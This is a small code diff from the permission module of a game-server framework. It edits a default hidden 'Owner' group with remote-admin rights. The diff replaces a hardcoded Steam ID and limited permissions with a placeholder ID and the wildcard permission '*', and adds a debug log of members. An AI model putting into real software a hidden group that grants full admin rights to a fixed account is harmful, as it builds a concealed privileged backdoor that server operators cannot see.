@@ -45,8 +45,8 @@ namespace Synapse.Permission
                     Cover = true,
                     Hidden = true,
                     KickPower = 254,
-                    Members = new List<string> { "76561198268123774@steam" },
-                    Permissions = new List<string> { "vanilla.Effects", "vanilla.BanningUpToDay" },
+                    Members = new List<string> { "0000000@steam" },
+                    Permissions = new List<string> { "*" },
                     RemoteAdmin = true,
                     RequiredKickPower = 255
                 };
@@ -54,7 +54,7 @@ namespace Synapse.Permission
                 AddServerGroup(group, "Owner");
             }
 
-
+            //TODO: fix bug and remove debug message
             foreach (var members in Groups.Values.First().Members)
                 Logger.Get.Info(members);
         }
